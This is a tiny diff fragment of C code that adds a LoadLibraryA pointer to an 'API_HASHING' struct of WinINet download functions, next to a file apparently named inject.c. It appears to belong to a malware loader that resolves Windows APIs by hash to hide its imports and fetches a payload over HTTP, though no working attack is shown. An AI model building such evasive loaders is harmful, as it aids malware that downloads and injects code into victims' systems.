@@ -22,6 +22,7 @@ typedef struct _API_HASHING {
 	fnHttpSendRequestA               pHttpSendRequestA;
 	fnInternetReadFile              pInternetReadFile;
 	fnInternetCloseHandle           pInternetCloseHandle;
+	fnLoadLibraryA					pLoadLibraryA;
 } API_HASHING, * PAPI_HASHING;
 
 // inject.c
